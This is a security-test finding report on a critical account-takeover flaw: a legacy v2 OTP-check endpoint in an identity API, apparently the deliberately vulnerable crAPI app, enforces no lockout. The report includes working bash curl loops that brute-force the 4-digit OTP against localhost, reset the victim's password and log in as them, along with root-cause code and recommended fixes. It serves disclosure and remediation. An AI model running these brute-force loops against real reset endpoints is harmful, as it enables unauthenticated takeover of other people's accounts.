# FIND-009: Account Takeover via OTP Brute-Force on Legacy v2 Endpoint

**CVSS Score:** 9.1 (Critical)
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
**CWE:** CWE-640: Weak Password Recovery Mechanism for Forgotten
Password (primary); CWE-307: Improper Restriction of Excessive
Authentication Attempts (secondary, the specific missing control)
**OWASP API Category:** API2:2023: Broken Authentication (primary);
API9:2023: Improper Inventory Management (contributing, a superseded
endpoint version left live alongside its fixed replacement)
**Status:** Confirmed, full account takeover demonstrated end to end
**Date found:** 2026-08-23

## Summary

The `identity` service exposes two versions of its OTP verification
endpoint. The current version (v3) correctly enforces a lockout after 9
failed attempts, invalidating the OTP. The superseded version (v2) is
still live, routes to a different backend method that increments a
failed-attempt counter but never checks it, and enforces no lockout at
all. Because the OTP is only 4 digits (10,000 possible values) and the
forget-password/check-otp flow requires no authentication, this allows a
complete, unauthenticated account takeover: trigger a password reset,
brute-force the OTP via v2 with no throttling, set an attacker-chosen
password, and log in as the victim. All steps were carried out in full
against a real test account, not merely demonstrated as theoretically
possible.

## Affected Endpoints

```
POST /identity/api/auth/forget-password
POST /identity/api/auth/v2/check-otp    <- vulnerable, no lockout
POST /identity/api/auth/v3/check-otp    <- correctly secured, for comparison
POST /identity/api/auth/login
```

## Root Cause (confirmed via source review)

`AuthController.java` routes the two versions to different service
methods:

```java
@PostMapping("/v2/check-otp")
// ...
CRAPIResponse validateOtpResponse = otpService.validateOtp(otpForm);
```

```java
@PostMapping("/v3/check-otp")
// ...
CRAPIResponse validateOtpResponse = otpService.secureValidateOtp(otpForm);
```

In `OtpServiceImpl.java`, the two methods differ precisely in whether the
failed-attempt count is enforced:

```java
// validateOtp() (v2) - increments count, never checks it
otp.setCount(otp.getCount() + 1);
validateOTPResponse = new CRAPIResponse(UserMessage.INVALID_OTP, 500);
```

```java
// secureValidateOtp() (v3) - locks out and invalidates at count == 9
} else if (otp.getCount() == 9) {
    otp.setCount(otp.getCount() + 1);
    invalidateOtp(otp);
    validateOTPResponse = new CRAPIResponse(UserMessage.EXCEED_NUMBER_OF_ATTEMPS, 503);
```

The lockout fix exists in the codebase and is correctly applied to v3.
It was never applied to v2, and v2 remains fully reachable.

## Steps to Reproduce

1. Trigger a password reset for a target account:
   `POST /identity/api/auth/forget-password` with the target's email.
2. Brute-force the 4-digit OTP against the legacy endpoint,
   `POST /identity/api/auth/v2/check-otp`, submitting an attacker-chosen
   new password alongside each guess. No authentication is required for
   any step.
3. Observe: no lockout occurs. Unlike v3 (which returns `503` and
   invalidates the OTP after 9 wrong attempts), v2 returns `500` on every
   wrong guess indefinitely.
4. On the correct guess, the endpoint returns `200` and the account's
   password is set to the attacker-chosen value in the same request.
5. Log in as the victim using the new, attacker-set password. Confirmed
   successful, full account takeover complete.

## Evidence

### Comparison: v3 (secured), full 10,000-value sweep locks out at

### attempt 10 and successfully blocks the entire remaining sweep

```bash
for i in $(seq -w 0 9999); do
  status=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST \
    https://localhost:8443/identity/api/auth/v3/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"otp\":\"$i\",\"password\":\"newpass123x\",\"email\":\"usera@test.com\"}")
  if [ "$status" == "503" ]; then echo "LOCKOUT at attempt $((10#$i + 1))"; fi
  if [ "$status" == "200" ]; then echo "FOUND: $i"; break; fi
done
```

Result: `LOCKOUT at attempt 10`, occurring once, no further lockout
messages, and critically, no `FOUND` printed across the full 10,000-value
sweep, confirming the correct OTP (which does exist somewhere in that
range) was never reachable once the lockout invalidated it after 9 wrong
guesses.

### v2 (vulnerable): full 10,000-value sweep, no lockout, match found

```bash
for i in $(seq -w 0 9999); do
  status=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST \
    https://localhost:8443/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"otp\":\"$i\",\"password\":\"newpass123x\",\"email\":\"usera@test.com\"}")
  if [ "$status" == "200" ]; then echo "FOUND: $i"; break; fi
done
```

Result: `FOUND: 4612`, reached after 4,612 unthrottled attempts, no `503`
at any point, no change in server behavior throughout.

### Confirmed account takeover: login as victim with attacker-set password

```
POST /identity/api/auth/login
{"email":"usera@test.com","password":"newpass123x"}
```

Response: `200 OK`

```json
{
  "token": "<REDACTED, valid Bearer token>",
  "type": "Bearer",
  "message": "Login successful",
  "mfaRequired": false
}
```

## Impact

Complete, unauthenticated account takeover of any user, given only their
email address. No password, no prior access, and no social engineering
required, only the ability to send HTTP requests. The full chain (reset
trigger, brute-force, password change, login) was completed end to end
against a real account in this test, not merely shown to be
theoretically possible. Given the same missing-rate-limiting pattern
already confirmed on three other `identity` endpoints (FIND-006,
FIND-007, FIND-008), this finding demonstrates the concrete, worst-case
consequence of that systemic gap: a small (4-digit) secret combined with
zero throttling is directly exploitable to full compromise, not merely a
theoretical risk. The existence of a correctly-secured v3 alongside the
vulnerable v2 also confirms this isn't a case of the development team
being unaware of the risk. A fix was built and deployed, but the
superseded, vulnerable version was never retired or blocked.

## Recommended Fix

1. Immediately remove or disable the `/v2/check-otp` route entirely, the
   fix already exists and is deployed as v3.
2. Apply the same lockout logic (or the same rate-limiting fix
   recommended in FIND-006/007/008) to any other legacy-versioned
   endpoint discovered during further testing, given the demonstrated
   precedent of a fix existing in one version while an unprotected
   sibling remains live.
3. As a longer-term process fix: establish a deprecation policy that
   actually removes or firewalls superseded API versions once a secure
   replacement ships, rather than leaving them reachable indefinitely.
4. Independently of the version issue, consider increasing OTP length
   or entropy, a 4-digit space is brute-forceable in minutes even with a
   correctly enforced lockout removed as the only defense; defense in
   depth would reduce reliance on rate limiting alone.

## Likelihood & Business Impact (OWASP Risk Rating)

**Likelihood: High.** No special access or skill required beyond basic
scripting, the vulnerable endpoint was discovered simply by comparing
two versions of the same route, and the full attack was completed in
minutes.

**Business Impact: High.** Complete, unauthenticated account takeover of
any user is about as severe as an API vulnerability gets, full loss of
account confidentiality and integrity, direct path to fraud, data theft,
or abuse of any function the victim's account has access to.

**Overall Severity: Critical** (High Likelihood x High Impact).
